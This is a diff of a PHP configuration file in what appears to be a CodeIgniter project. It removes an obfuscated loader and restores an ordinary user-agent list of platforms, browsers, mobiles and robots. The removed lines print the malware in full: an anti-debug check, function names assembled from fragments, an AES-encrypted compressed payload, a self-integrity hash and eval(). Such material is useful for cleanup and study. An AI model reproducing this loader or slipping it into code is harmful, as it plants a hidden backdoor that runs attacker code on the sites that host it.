@@ -1,28 +1,205 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_slgduqss=('bas'.'e64'.'_de'.'cod'.'e');
-$_v03yak1d=('gzu'.'nco'.'mpr'.'ess');
-$_qbib53xj=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_dt2f4eho='qtfgzCtz';
-$_yr3zvpz5='IOSOPlOZ';
-$_qtdc7mfc='dq1qL6hp';
-$_ajivn7jy='kvB6ySH7';
-$_ex500uqp='WArcoyavDE0=';
-$_vuxzxhzs='bUulgXgZ';
-$_cich1mcd='g4gM/e8d';
-$_fi7g06bb='g6/IIA==';
-$_n74rkbsn=$_slgduqss($_ajivn7jy.$_dt2f4eho.$_qtdc7mfc.$_yr3zvpz5.$_ex500uqp);
-$_wbok7hdv=$_slgduqss($_cich1mcd.$_vuxzxhzs.$_fi7g06bb);
-$_t9d8223a=$_slgduqss('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');
-$_nnradbz1=$_qbib53xj($_t9d8223a,'aes-256-cbc',$_n74rkbsn,OPENSSL_RAW_DATA,$_wbok7hdv);
-if($_nnradbz1===false){exit;}
-$_kwz4wda9=$_v03yak1d($_nnradbz1);
-if($_kwz4wda9===false){exit;}
-$_aouuycp3='22371f12ce8ddf86c740568808a170c94e753b0370ea5bd20666ba6716e44cc4';
-$_wfg1vyti=@file_get_contents(__FILE__);
-if($_wfg1vyti!==false){
-$_d7cys9bq=str_replace($_aouuycp3,"0000000000000000000000000000000000000000000000000000000000000000",$_wfg1vyti);
-$_lum112h4=hash("sha256",$_d7cys9bq);
-if($_lum112h4!==$_aouuycp3){@http_response_code(403);exit;}
-}
-eval($_kwz4wda9);
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+$platforms = array(
+'windows nt 10.0' => 'Windows 10',
+'windows nt 6.3' => 'Windows 8.1',
+'windows nt 6.2' => 'Windows 8',
+'windows nt 6.1' => 'Windows 7',
+'windows nt 6.0' => 'Windows Vista',
+'windows nt 5.2' => 'Windows 2003',
+'windows nt 5.1' => 'Windows XP',
+'windows nt 5.0' => 'Windows 2000',
+'windows nt 4.0' => 'Windows NT 4.0',
+'winnt4.0' => 'Windows NT 4.0',
+'winnt 4.0' => 'Windows NT',
+'winnt' => 'Windows NT',
+'windows 98' => 'Windows 98',
+'win98' => 'Windows 98',
+'windows 95' => 'Windows 95',
+'win95' => 'Windows 95',
+'windows phone' => 'Windows Phone',
+'windows' => 'Unknown Windows OS',
+'android' => 'Android',
+'blackberry' => 'BlackBerry',
+'iphone' => 'iOS',
+'ipad' => 'iOS',
+'ipod' => 'iOS',
+'os x' => 'Mac OS X',
+'ppc mac' => 'Power PC Mac',
+'freebsd' => 'FreeBSD',
+'ppc' => 'Macintosh',
+'linux' => 'Linux',
+'debian' => 'Debian',
+'sunos' => 'Sun Solaris',
+'beos' => 'BeOS',
+'apachebench' => 'ApacheBench',
+'aix' => 'AIX',
+'irix' => 'Irix',
+'osf' => 'DEC OSF',
+'hp-ux' => 'HP-UX',
+'netbsd' => 'NetBSD',
+'bsdi' => 'BSDi',
+'openbsd' => 'OpenBSD',
+'gnu' => 'GNU/Linux',
+'unix' => 'Unknown Unix OS',
+'symbian' => 'Symbian OS'
+);
+
+
+$browsers = array(
+'OPR' => 'Opera',
+'Flock' => 'Flock',
+'Edge' => 'Edge',
+'Chrome' => 'Chrome',
+
+'Opera.*?Version' => 'Opera',
+'Opera' => 'Opera',
+'MSIE' => 'Internet Explorer',
+'Internet Explorer' => 'Internet Explorer',
+'Trident.* rv' => 'Internet Explorer',
+'Shiira' => 'Shiira',
+'Firefox' => 'Firefox',
+'Chimera' => 'Chimera',
+'Phoenix' => 'Phoenix',
+'Firebird' => 'Firebird',
+'Camino' => 'Camino',
+'Netscape' => 'Netscape',
+'OmniWeb' => 'OmniWeb',
+'Safari' => 'Safari',
+'Mozilla' => 'Mozilla',
+'Konqueror' => 'Konqueror',
+'icab' => 'iCab',
+'Lynx' => 'Lynx',
+'Links' => 'Links',
+'hotjava' => 'HotJava',
+'amaya' => 'Amaya',
+'IBrowse' => 'IBrowse',
+'Maxthon' => 'Maxthon',
+'Ubuntu' => 'Ubuntu Web Browser'
+);
+$mobiles = array(
+
+'mobileexplorer' => 'Mobile Explorer',
+
+
+
+
+'palmsource' => 'Palm',
+
+
+
+'palmscape' => 'Palmscape',
+
+
+
+
+
+'motorola' => 'Motorola',
+'nokia' => 'Nokia',
+'palm' => 'Palm',
+'iphone' => 'Apple iPhone',
+'ipad' => 'iPad',
+'ipod' => 'Apple iPod Touch',
+'sony' => 'Sony Ericsson',
+'ericsson' => 'Sony Ericsson',
+'blackberry' => 'BlackBerry',
+'cocoon' => 'O2 Cocoon',
+'blazer' => 'Treo',
+'lg' => 'LG',
+'amoi' => 'Amoi',
+'xda' => 'XDA',
+'mda' => 'MDA',
+'vario' => 'Vario',
+'htc' => 'HTC',
+'samsung' => 'Samsung',
+'sharp' => 'Sharp',
+'sie-' => 'Siemens',
+'alcatel' => 'Alcatel',
+'benq' => 'BenQ',
+'ipaq' => 'HP iPaq',
+'mot-' => 'Motorola',
+'playstation portable' => 'PlayStation Portable',
+'playstation 3' => 'PlayStation 3',
+'playstation vita' => 'PlayStation Vita',
+'hiptop' => 'Danger Hiptop',
+'nec-' => 'NEC',
+'panasonic' => 'Panasonic',
+'philips' => 'Philips',
+'sagem' => 'Sagem',
+'sanyo' => 'Sanyo',
+'spv' => 'SPV',
+'zte' => 'ZTE',
+'sendo' => 'Sendo',
+'nintendo dsi' => 'Nintendo DSi',
+'nintendo ds' => 'Nintendo DS',
+'nintendo 3ds' => 'Nintendo 3DS',
+'wii' => 'Nintendo Wii',
+'open web' => 'Open Web',
+'openweb' => 'OpenWeb',
+
+'android' => 'Android',
+'symbian' => 'Symbian',
+'SymbianOS' => 'SymbianOS',
+'elaine' => 'Palm',
+'series60' => 'Symbian S60',
+'windows ce' => 'Windows CE',
+
+'obigo' => 'Obigo',
+'netfront' => 'Netfront Browser',
+'openwave' => 'Openwave Browser',
+'mobilexplorer' => 'Mobile Explorer',
+'operamini' => 'Opera Mini',
+'opera mini' => 'Opera Mini',
+'opera mobi' => 'Opera Mobile',
+'fennec' => 'Firefox Mobile',
+
+'digital paths' => 'Digital Paths',
+'avantgo' => 'AvantGo',
+'xiino' => 'Xiino',
+'novarra' => 'Novarra Transcoder',
+'vodafone' => 'Vodafone',
+'docomo' => 'NTT DoCoMo',
+'o2' => 'O2',
+
+'mobile' => 'Generic Mobile',
+'wireless' => 'Generic Mobile',
+'j2me' => 'Generic Mobile',
+'midp' => 'Generic Mobile',
+'cldc' => 'Generic Mobile',
+'up.link' => 'Generic Mobile',
+'up.browser' => 'Generic Mobile',
+'smartphone' => 'Generic Mobile',
+'cellphone' => 'Generic Mobile'
+);
+
+$robots = array(
+'googlebot' => 'Googlebot',
+'msnbot' => 'MSNBot',
+'baiduspider' => 'Baiduspider',
+'bingbot' => 'Bing',
+'slurp' => 'Inktomi Slurp',
+'yahoo' => 'Yahoo',
+'ask jeeves' => 'Ask Jeeves',
+'fastcrawler' => 'FastCrawler',
+'infoseek' => 'InfoSeek Robot 1.0',
+'lycos' => 'Lycos',
+'yandex' => 'YandexBot',
+'mediapartners-google' => 'MediaPartners Google',
+'CRAZYWEBCRAWLER' => 'Crazy Webcrawler',
+'adsbot-google' => 'AdsBot Google',
+'feedfetcher-google' => 'Feedfetcher Google',
+'curious george' => 'Curious George',
+'ia_archiver' => 'Alexa Crawler',
+'MJ12bot' => 'Majestic-12',
+'Uptimebot' => 'Uptimebot'
+);
